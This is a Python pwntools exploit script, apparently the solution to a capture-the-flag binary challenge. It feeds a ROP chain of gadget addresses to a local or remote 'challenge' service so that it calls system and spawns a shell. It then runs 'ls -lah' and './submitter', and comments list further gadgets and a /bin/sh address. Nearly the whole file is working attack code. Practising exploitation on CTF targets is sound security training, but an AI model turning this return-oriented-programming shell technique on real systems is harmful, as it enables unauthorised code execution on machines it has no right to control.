#!/usr/bin/env python3

from pwn import *

if os.environ.get("LOCAL"):
    context.terminal = ["gnome-terminal", "-e"]

    io = process("./challenge")
    # io = gdb.debug("./challenge", f"b *0x401a55\nc")
else:
    HOST = os.environ.get('HOST', 'localhost')
    PORT = 31337

    io = remote(HOST, int(PORT))

# Setup
io.sendlineafter(b":", str(1).encode())
io.sendlineafter(b":", str(2).encode())
io.sendlineafter(b":", str(3).encode())
io.sendlineafter(b":", str(3_00_00_00_00).encode())
io.sendlineafter(b":", str(1234).encode())

# ROP
io.sendlineafter(b":", str(402218).encode()) # pop rdi, pop rbp, ret
io.sendlineafter(b":", str(490499).encode()) # rdi -> 0x490499
io.sendlineafter(b":", str(1337).encode()) # rbp -> WTV

io.sendlineafter(b":", str(402216).encode()) # pop rsi ; pop r15 ; pop rbp ; ret
io.sendlineafter(b":", str(10060).encode()) # rsi -> 0x10060
io.sendlineafter(b":", str(1337).encode()) # r15 -> WTV
io.sendlineafter(b":", str(1337).encode()) # rbp -> WTV

io.sendlineafter(b":", str(471884).encode()) # add al, 0x48 ; add eax, edi ; ret

io.sendlineafter(b":", str(493943).encode()) # add edi, esi ; add eax, dword ptr [rax] ; ret

io.sendlineafter(b":", str(403675).encode()) # ret

io.sendlineafter(b":", str(401917).encode()) # call system

io.sendlineafter(b":", str(0).encode()) # exec

io.sendline(b"ls -lah")
io.sendline(b"./submitter")
io.sendline(b"exit")

print(io.recvall().decode())

# ASM gadgets
# 0x0000000000410939 : xchg esi, eax ; iretd
# 0x0000000000426893 : inc rdi ; add rax, rdi ; vzeroupper ; ret
# 0x0000000000469631 : sub edi, -0x41 ; add rax, rdi ; vzeroupper ; ret
# 0x0000000000493933 : or edi, esi ; add eax, dword ptr [rax] ; ret
# 0x0000000000402216 : pop rsi ; pop r15 ; pop rbp ; ret
# 0x0000000000493943 : add edi, esi ; add eax, dword ptr [rax] ; ret
# 0x0000000000487212 : pop rax ; pop rdx ; leave ; ret
# 0x0000000000471884 : add al, 0x48 ; add eax, edi ; ret

# /bin/sh -> 004a04f9
